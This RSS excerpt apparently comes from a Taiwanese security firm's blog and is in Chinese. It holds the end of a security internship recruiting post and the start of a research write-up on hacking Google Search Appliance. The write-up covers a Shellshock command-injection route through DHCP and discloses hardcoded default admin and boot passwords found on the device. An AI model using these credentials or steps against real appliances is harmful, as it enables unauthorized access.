&lt;p&gt;每月新台幣 16,000 元&lt;/p&gt;

&lt;h2 id=&quot;招募條件資格與流程&quot;&gt;招募條件資格與流程&lt;/h2&gt;

&lt;h3 id=&quot;實習條件要求&quot;&gt;實習條件要求&lt;/h3&gt;

&lt;h4 id=&quot;binary&quot;&gt;Binary&lt;/h4&gt;

&lt;ul&gt;
  &lt;li&gt;基本逆向工程及除錯能力
    &lt;ul&gt;
      &lt;li&gt;能看懂組合語言並瞭解基本 Debugger 使用技巧&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;基本漏洞利用能力
    &lt;ul&gt;
      &lt;li&gt;須知道 Stack overflow、ROP 等相關利用技巧&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;基本 Scripting Language 開發能力
    &lt;ul&gt;
      &lt;li&gt;Python、Ruby&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;具備分析大型 Open Source 專案能力
    &lt;ul&gt;
      &lt;li&gt;以 C/C++ 為主&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;具備基礎作業系統知識
    &lt;ul&gt;
      &lt;li&gt;例如知道 Virtual Address 與 Physical Address 的概念&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;Code Auditing
    &lt;ul&gt;
      &lt;li&gt;知道怎樣寫的程式碼會有問題
        &lt;ul&gt;
          &lt;li&gt;Buffer Overflow&lt;/li&gt;
          &lt;li&gt;Use After free&lt;/li&gt;
          &lt;li&gt;Race Condition&lt;/li&gt;
          &lt;li&gt;…&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;具備研究熱誠，習慣了解技術本質&lt;/li&gt;
  &lt;li&gt;加分但&lt;strong&gt;非必要&lt;/strong&gt;條件
    &lt;ul&gt;
      &lt;li&gt;CTF 比賽經驗&lt;/li&gt;
      &lt;li&gt;pwnable.tw 成績&lt;/li&gt;
      &lt;li&gt;樂於分享技術
        &lt;ul&gt;
          &lt;li&gt;有公開的技術 blog/slide、Write-ups 或是演講&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;精通 IDA Pro 或 Ghidra&lt;/li&gt;
      &lt;li&gt;有寫過 1-day 利用程式&lt;/li&gt;
      &lt;li&gt;具備下列其中之一經驗
        &lt;ul&gt;
          &lt;li&gt;Kernel Exploit&lt;/li&gt;
          &lt;li&gt;Windows Exploit&lt;/li&gt;
          &lt;li&gt;Browser Exploit&lt;/li&gt;
          &lt;li&gt;Bug Bounty&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;web&quot;&gt;Web&lt;/h4&gt;

&lt;ul&gt;
  &lt;li&gt;熟悉 OWASP Web Top 10。&lt;/li&gt;
  &lt;li&gt;理解 PortSwigger Web Security Academy 中所有的安全議題或已完成所有 Lab。
    &lt;ul&gt;
      &lt;li&gt;參考連結：https://portswigger.net/web-security/all-materials&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;理解計算機網路的基本概念。&lt;/li&gt;
  &lt;li&gt;熟悉 Command Line 操作，包含 Unix-like 和 Windows 作業系統的常見或內建系統指令工具。&lt;/li&gt;
  &lt;li&gt;熟悉任一種網頁程式語言（如：PHP、ASP.NET、JSP），具備可以建立完整網頁服務的能力。&lt;/li&gt;
  &lt;li&gt;熟悉任一種 Scripting Language（如：Shell Script、Python、Ruby），並能使用腳本輔以研究。&lt;/li&gt;
  &lt;li&gt;具備除錯能力，能善用 Debugger 追蹤程式流程、能重現並收斂問題。&lt;/li&gt;
  &lt;li&gt;具備可以建置、設定常見網頁伺服器（如：Nginx、Apache）及作業系統（如：Linux）的能力。&lt;/li&gt;
  &lt;li&gt;具備追根究柢的精神。&lt;/li&gt;
  &lt;li&gt;加分但&lt;strong&gt;非必要&lt;/strong&gt;條件
    &lt;ul&gt;
      &lt;li&gt;曾經獨立挖掘過 0-day 漏洞。&lt;/li&gt;
      &lt;li&gt;曾經獨立分析過已知漏洞並能撰寫 1-day exploit。&lt;/li&gt;
      &lt;li&gt;曾經於 CTF 比賽中擔任出題者並建置過題目。&lt;/li&gt;
      &lt;li&gt;擁有 OSCP 證照或同等能力之證照。&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;應徵流程&quot;&gt;應徵流程&lt;/h3&gt;

&lt;p&gt;本次甄選一共分為二個階段：&lt;/p&gt;

&lt;h4 id=&quot;第一階段書面審查&quot;&gt;第一階段：書面審查&lt;/h4&gt;

&lt;p&gt;第一階段為書面審查，會需要審查下列兩個項目&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;履歷內容&lt;/li&gt;
  &lt;li&gt;簡答題答案
    &lt;ul&gt;
      &lt;li&gt;題目 1：請提出三個，你印象最深刻或感到有趣、於西元 2021 ~ 2023 年間公開的真實漏洞或攻擊鏈案例，並依自己的理解簡述說明各個漏洞的成因、利用條件和可以造成的影響。&lt;/li&gt;
      &lt;li&gt;題目 2：實習期間想要研究的主題，請提出三個可能選擇的明確主題，並簡單說明提出的理由或想完成的內容，例如：
        &lt;ul&gt;
          &lt;li&gt;研究◯◯開源軟體，找到可 RCE 的重大風險弱點。&lt;/li&gt;
          &lt;li&gt;研究 AD CS 的攻擊手法，嘗試挖掘新的攻擊可能性或向量。&lt;/li&gt;
          &lt;li&gt;研究常見的路由器，目標包括：AA-123 路由器、BB-456 無線路由器。&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;本階段收件截止時間為 &lt;strong&gt;2023/08/11 23:59&lt;/strong&gt;，我們會根據您的履歷及題目所回答的內容來決定是否有通過第一階段，我們會在 10 個&lt;strong&gt;工作天&lt;/strong&gt;內回覆。&lt;/p&gt;

&lt;h4 id=&quot;第二階段面試&quot;&gt;第二階段：面試&lt;/h4&gt;
&lt;p&gt;此階段為 30~120 分鐘（依照組別需求而定，會另行通知）的面試，會有 2~3 位資深夥伴參與，評估您是否具備本次實習所需的技術能力與人格特質。&lt;/p&gt;

&lt;h4 id=&quot;時間軸&quot;&gt;時間軸&lt;/h4&gt;

&lt;ul&gt;
  &lt;li&gt;2023/07/19 - 2023/08/11 公開招募&lt;/li&gt;
  &lt;li&gt;2023/08/14 - 2023/08/24 面試&lt;/li&gt;
  &lt;li&gt;2023/08/28 前回應結果&lt;/li&gt;
  &lt;li&gt;2023/09/04 第四屆實習計畫於當週開始&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;報名方式&quot;&gt;報名方式&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;請將您的&lt;strong&gt;履歷&lt;/strong&gt;及&lt;strong&gt;題目答案&lt;/strong&gt;以 PDF 格式寄到 recruiting_intern@devco.re
    &lt;ul&gt;
      &lt;li&gt;履歷格式請參考範例示意（&lt;a href=&quot;/assets/files/recruit/Resume_Example.docx&quot;&gt;DOCX&lt;/a&gt;、&lt;a href=&quot;/assets/files/recruit/Resume_Example.pages&quot;&gt;PAGES&lt;/a&gt;、&lt;a href=&quot;/assets/files/recruit/Resume_Example.pdf&quot;&gt;PDF&lt;/a&gt;）並轉成 PDF。若您有自信，也可以自由發揮最能呈現您能力的履歷。&lt;/li&gt;
      &lt;li&gt;請於 &lt;strong&gt;2023/08/11 23:59&lt;/strong&gt; 前寄出（如果名額已滿則視情況提早結束）&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;信件標題格式：[應徵] 職位 您的姓名（範例：[應徵] Web 組實習生 王小美）&lt;/li&gt;
  &lt;li&gt;履歷內容請務必控制在三頁以內，至少需包含以下內容：
    &lt;ul&gt;
      &lt;li&gt;基本資料&lt;/li&gt;
      &lt;li&gt;學歷&lt;/li&gt;
      &lt;li&gt;實習經歷&lt;/li&gt;
      &lt;li&gt;社群活動經歷&lt;/li&gt;
      &lt;li&gt;特殊事蹟&lt;/li&gt;
      &lt;li&gt;過去對於資安的相關研究&lt;/li&gt;
      &lt;li&gt;MBTI 職業性格測試結果（&lt;a href=&quot;https://www.apesk.com/mbti/dati_tw.asp&quot;&gt;測試網頁&lt;/a&gt;）&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;若有應徵相關問題，請一律使用 Email 聯繫，如造成您的不便請見諒，我們感謝您的來信，並期待您的加入！&lt;/p&gt;
</description>
                <link>https://devco.re/blog/2023/07/18/4nd-internship-program-recruit/</link>
                <guid>https://devco.re/blog/2023/07/18/4nd-internship-program-recruit</guid>
                <pubDate>Tue, 18 Jul 2023 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>[REL] 深入破解 Google Search Appliance</title>
                <description>&lt;p&gt;&lt;a href=&quot;/blog/2023/07/07/a-journey-into-hacking-google-search-appliance-en&quot;&gt;English Version&lt;/a&gt;, &lt;a href=&quot;/blog/2023/07/07/a-journey-into-hacking-google-search-appliance/&quot;&gt;中文版本&lt;/a&gt;&lt;/p&gt;

&lt;h3 id=&quot;懶人包&quot;&gt;懶人包&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;GSA 管理界面認證後任意指令執行&lt;/li&gt;
  &lt;li&gt;GSA 搜尋介面任意讀檔&lt;/li&gt;
  &lt;li&gt;GSA 使用 Oracle 的 Outside-in Technology 轉換文件格式&lt;/li&gt;
  &lt;li&gt;Google 網頁服務有一些固定的URI，會提供此服務的自身資訊&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;前言&quot;&gt;前言&lt;/h3&gt;

&lt;p&gt;Google Search Appliance (以下簡稱 GSA ) 是 Google 於2002 年開始為企業推出的搜尋設備，主要功能為放置於企業內網用於索引內部網路資訊並提供檢索。於 2005 年左右推出給個人及小型企業使用的 Google Mini，於 2008 年底左右有發布虛擬機器版本，名稱為 Virtual Google Search Appliance (以下簡稱 vGSA)，後來於 2018年底結束產品生命週期，產品線整合進入 Cloud Search。&lt;/p&gt;

&lt;h3 id=&quot;設備軟體取得&quot;&gt;設備、軟體取得&lt;/h3&gt;

&lt;p&gt;從 ebay 以關鍵字 Google Search Appliance 搜尋並嘗試購買此設備，
如果不幸硬碟資料已被清除，也只能嘗試多買幾台了。&lt;/p&gt;

&lt;p&gt;幸運的是，購入的第一台就是未遭完整清除的 GSA：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20230707/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;現在仍然可以找到正在被販售的設備：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20230707/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;另一方面 vGSA 原始公開連結已被移除，
&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://dl.google.com/vgsa/vgsa\_20090210.7z&lt;/code&gt; [已被移除]
&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://dl.google.com/vgsa/vgsa\_20081028.7z&lt;/code&gt; [已被移除]&lt;/p&gt;

&lt;p&gt;後來用 BitTorrent 磁力連結 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;magnet:?xt=urn:btih:89388ACE8C3B91FDD3A2F86D8CBB78C58A70D992&lt;/code&gt; 成功取得檔案。&lt;/p&gt;

&lt;p&gt;接著再從 google groups 中找到舊版軟體連接：&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;https://groups.google.com/g/google-search-appliance-help/c/Qn5aO5r2Joo/m/PTw8ZDWu6vYJ&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20230707/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;連結為：&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://dl.google.com/dl/enterprise/install_bundle-10000622-7.2.0-112.bin&lt;/code&gt; [已被移除]&lt;/p&gt;

&lt;p&gt;由公開網頁中，可取得版本號碼：
&lt;a href=&quot;http://web.archive.org/web/20210116194907/https://support.google.com/gsa/answer/7020590?hl=en&amp;amp;ref_topic=2709671&quot;&gt;http://web.archive.org/web/20210116194907/https://support.google.com/gsa/answer/7020590?hl=en&amp;amp;ref_topic=2709671&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;猜測檔案名稱規則為 install_bundle-10000(三位數字)-7.(一位數字).(數字)-(三位數字).bin&lt;/p&gt;

&lt;p&gt;並編寫 shell script 嘗試下載：&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;j&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;622&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;j&amp;lt;999&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;+j&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;do for&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;i&amp;lt;444&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;+i&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;do &lt;/span&gt;wget http://dl.google.com/dl/enterprise/install_bundle-10000&lt;span class=&quot;nv&quot;&gt;$j&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-7&lt;/span&gt;.2.0-&lt;span class=&quot;nv&quot;&gt;$i&lt;/span&gt;.bin&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;done
for&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;j&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;661&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;j&amp;lt;999&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;+j&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;do for&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;i&amp;lt;444&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;+i&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;do &lt;/span&gt;wget http://dl.google.com/dl/enterprise/install_bundle-10000&lt;span class=&quot;nv&quot;&gt;$j&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-7&lt;/span&gt;.4.0-&lt;span class=&quot;nv&quot;&gt;$i&lt;/span&gt;.bin&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;done
for&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;j&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;693&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;j&amp;lt;999&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;+j&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;do for&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;i&amp;lt;444&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;+i&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;do &lt;/span&gt;wget http://dl.google.com/dl/enterprise/install_bundle-10000&lt;span class=&quot;nv&quot;&gt;$j&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-7&lt;/span&gt;.6.0-&lt;span class=&quot;nv&quot;&gt;$i&lt;/span&gt;.bin&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;加上網路搜尋到的資料，成功取回以下檔案：&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;all_langs-lang-pack-2.1-1.bin
all_langs-lang-pack-2.2-1.bin
centos_patch_files-6.0.0-22.bin
centos_patch_files-6.14.0-28.bin
centos_patch_files-7.0.14-238.bin
centos_patch_files-7.2.0-252.bin
centos_patch_files-7.2.0-264.bin
centos_patch_files-7.2.0-270.bin
centos_patch_files-7.2.0-280.bin
centos_patch_files-7.2.0-286.bin
install_bundle-10000653-7.2.0-252.bin
install_bundle-10000658-7.2.0-264.bin
install_bundle-10000661-7.2.0-270.bin
install_bundle-10000681-7.4.0-64.bin
install_bundle-10000685-7.4.0-72.bin
install_bundle-10000686-7.4.0-74.bin
install_bundle-10000692-7.4.0-82.bin
install_bundle-10000762-7.6.0-36.bin
install_bundle-10000767-7.6.0-42.bin
install_bundle-10000772-7.6.0-46.bin
install_bundle-10000781-7.6.0-58.bin
install_bundle-10000810-7.6.50-30.bin
install_bundle-10000822-7.6.50-36.bin
install_bundle-10000855-7.6.50-64.bin
install_bundle-10000878-7.6.250-12.bin
install_bundle-10000888-7.6.250-20.bin
install_bundle-10000901-7.6.250-26.bin
install_bundle-10000915-7.6.360-10.bin
install_bundle-10000926-7.6.360-16.bin
install_bundle-10000967-7.6.512-18.bin
sw_files-5.0.4-22.bin
sw_files-6.14.0-28.bin
sw_files-7.0.14-238.bin
vm_patch_1_for_504_G22_and_G24_only.bin
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;vgsa-virtual-google-search-appliance&quot;&gt;vGSA (Virtual Google Search Appliance)&lt;/h3&gt;

&lt;p&gt;接著開始 VGSA 的研究，預設情況下完成匯入虛擬機後此系統只提供了一個網路設定的功能，
沒有提供 shell 可供操作使用。但是由於虛擬機器是執行在自己環境上，
所以通常可以透過下列方式取得系統權限：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;直接修改未加密的磁碟機檔案&lt;/li&gt;
  &lt;li&gt;修改虛擬機記憶體內容&lt;/li&gt;
  &lt;li&gt;使用其他作業系統光碟或磁碟開機&lt;/li&gt;
  &lt;li&gt;其他已知漏洞&lt;/li&gt;
  &lt;li&gt;寫死的管理員或系統帳號、密碼&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;下圖為 vGSA 網路設定畫面：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20230707/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h4 id=&quot;cve-2014-6271&quot;&gt;CVE-2014-6271&lt;/h4&gt;

&lt;p&gt;當測試早期的 Linux 設備及服務，尤其是使用 RedHat 系列的作業系統時，通常會有 Shellshock 的漏洞，
而發布日期再2008的 vGSA 也不例外。dhcp server 中插入 option 114 會被設置於環境變數，從而觸發漏洞，執行任意指令：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20230707/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;指令為：&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;useradd zzzzgsa&lt;/code&gt;，可以從主控台輸出中看到此指令被重複執行，並產生錯誤訊息。&lt;/p&gt;

&lt;h4 id=&quot;vgsa-觀察&quot;&gt;vGSA 觀察&lt;/h4&gt;

&lt;p&gt;成功取得作業系統權限後，進行網路環境、執行程式、檔案系統的觀察，以下是作業系統環境觀察心得：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;版本號為 5.2.0.G.27。&lt;/li&gt;
  &lt;li&gt;服務主要由 C/C++、java、python 編寫&lt;/li&gt;
  &lt;li&gt;/export/hda3 似乎是服務主要使用的目錄&lt;/li&gt;
  &lt;li&gt;/etc/shadow 存在帳號 root、密碼雜湊為 x███████████M&lt;/li&gt;
  &lt;li&gt;管理介面 8000、8443 預設管理密碼為 j0njlRXpU5CQ&lt;/li&gt;
  &lt;li&gt;/.gnupg 存在 ent_box_key 公私鑰。&lt;/li&gt;
  &lt;li&gt;/.gnupg 存在 google_license_key 公鑰。&lt;/li&gt;
  &lt;li&gt;/.ssh/authorized_keys 存在兩組公鑰。&lt;/li&gt;
  &lt;li&gt;/root/.ssh/authorized_keys 存在一組公鑰。&lt;/li&gt;
  &lt;li&gt;/root/.ssh/ 存在兩組ssh 公私鑰。&lt;/li&gt;
  &lt;li&gt;/root/.gnupg/ 存在 ent_box_key 公私鑰。&lt;/li&gt;
  &lt;li&gt;使用 Oracle 公司的 Outside In Technology 將文件轉換為 html網頁。&lt;/li&gt;
  &lt;li&gt;java 執行環境使用 Security Manager 保護。&lt;/li&gt;
  &lt;li&gt;請求工程師支援功能使用 ppp 建構虛擬私有網路， /etc/ppp/chap-secrets 存有帳號密碼 ( z██████c、]███████T )&lt;/li&gt;
  &lt;li&gt;/etc/lilo.conf中的開機選單密碼為 cmBalx7&lt;/li&gt;
  &lt;li&gt;/export/hda3/versionmanager/google_key.symmetric 有一把疑似為對稱式加密使用的密碼&lt;/li&gt;
  &lt;li&gt;/export/hda3/versionmanager/vmanager_passwd 存在兩組帳密組合 ( admin： M█████████████████████████w=:9██=  google：w█████████████████████████o=:N██=  )&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;而具有網路服務的執行程式的觀察如下：&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;通訊埠&lt;/th&gt;
      &lt;th&gt;服務名稱&lt;/th&gt;
      &lt;th&gt;程式編寫語言&lt;/th&gt;
      &lt;th&gt;服務說明&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;22&lt;/td&gt;
      &lt;td&gt;ssh&lt;/td&gt;
      &lt;td&gt;C/C++&lt;/td&gt;
      &lt;td&gt;OpenSSH Server&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;53&lt;/td&gt;
      &lt;td&gt;named&lt;/td&gt;
      &lt;td&gt;C/C++&lt;/td&gt;
      &lt;td&gt;Bind Named&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;953&lt;/td&gt;
      &lt;td&gt;named&lt;/td&gt;
      &lt;td&gt;C/C++&lt;/td&gt;
      &lt;td&gt;Bind Named&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;1111&lt;/td&gt;
      &lt;td&gt;webserver_config&lt;/td&gt;
      &lt;td&gt;python&lt;/td&gt;
      &lt;td&gt;Installer&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2100&lt;/td&gt;
      &lt;td&gt;adminrunner.py&lt;/td&gt;
      &lt;td&gt;python&lt;/td&gt;
      &lt;td&gt;enterpriseconsole backend&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;3990&lt;/td&gt;
      &lt;td&gt;monitor&lt;/td&gt;
      &lt;td&gt;C/C++&lt;/td&gt;
      &lt;td&gt;monitor&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;4000&lt;/td&gt;
      &lt;td&gt;rtserver&lt;/td&gt;
      &lt;td&gt;C/C++&lt;/td&gt;
      &lt;td&gt;未知&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;4430&lt;/td&gt;
      &lt;td&gt;EnterpriseFrontend&lt;/td&gt;
      &lt;td&gt;Java (with security manager)&lt;/td&gt;
      &lt;td&gt;https 前端&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;4911&lt;/td&gt;
      &lt;td&gt;borgmon&lt;/td&gt;
      &lt;td&gt;C/C++&lt;/td&gt;
      &lt;td&gt;borgmon&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;4916&lt;/td&gt;
      &lt;td&gt;reactor&lt;/td&gt;
      &lt;td&gt;C/C++&lt;/td&gt;
      &lt;td&gt;未知&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;5000&lt;/td&gt;
      &lt;td&gt;rtserver&lt;/td&gt;
      &lt;td&gt;C/C++&lt;/td&gt;
      &lt;td&gt;未知&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;5600&lt;/td&gt;
      &lt;td&gt;rtserver&lt;/td&gt;
      &lt;td&gt;C/C++&lt;/td&gt;
      &lt;td&gt;未知&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;6600&lt;/td&gt;
      &lt;td&gt;cacheserver&lt;/td&gt;
      &lt;td&gt;C/C++&lt;/td&gt;
      &lt;td&gt;未知&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;7800&lt;/td&gt;
      &lt;td&gt;EnterpriseFrontend&lt;/td&gt;
      &lt;td&gt;Java (with security manager)&lt;/td&gt;
      &lt;td&gt;未知&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;7880&lt;/td&gt;
      &lt;td&gt;TableServer&lt;/td&gt;
      &lt;td&gt;Java (with security manager)&lt;/td&gt;
      &lt;td&gt;未知&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;7882&lt;/td&gt;
      &lt;td&gt;AuthzChecker&lt;/td&gt;
      &lt;td&gt;Java (without security manager)&lt;/td&gt;
      &lt;td&gt;未知&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;7886&lt;/td&gt;
      &lt;td&gt;tomcat&lt;/td&gt;
      &lt;td&gt;Java&lt;/td&gt;
      &lt;td&gt;tomcat server&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;8000&lt;/td&gt;
      &lt;td&gt;EnterpriseAdminConsole&lt;/td&gt;
      &lt;td&gt;Java (without security manager)&lt;/td&gt;
      &lt;td&gt;未知&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;8443&lt;/td&gt;
      &lt;td&gt;stunnel&lt;/td&gt;
      &lt;td&gt;C/C++&lt;/td&gt;
      &lt;td&gt;redirect http to https&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;8888&lt;/td&gt;
      &lt;td&gt;GWS&lt;/td&gt;
      &lt;td&gt;C/C++&lt;/td&gt;
      &lt;td&gt;未知&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;9300&lt;/td&gt;
      &lt;td&gt;oneboxserver&lt;/td&gt;
      &lt;td&gt;C/C++&lt;/td&gt;
      &lt;td&gt;未知&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;9328&lt;/td&gt;
      &lt;td&gt;entspellmixer&lt;/td&gt;
      &lt;td&gt;C/C++&lt;/td&gt;
      &lt;td&gt;未知&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;9400&lt;/td&gt;
      &lt;td&gt;mixserver&lt;/td&gt;
      &lt;td&gt;C/C++&lt;/td&gt;
      &lt;td&gt;未知&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;9402&lt;/td&gt;
      &lt;td&gt;mixserver&lt;/td&gt;
      &lt;td&gt;C/C++&lt;/td&gt;
      &lt;td&gt;未知&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;9448&lt;/td&gt;
      &lt;td&gt;qrewrite&lt;/td&gt;
      &lt;td&gt;C/C++&lt;/td&gt;
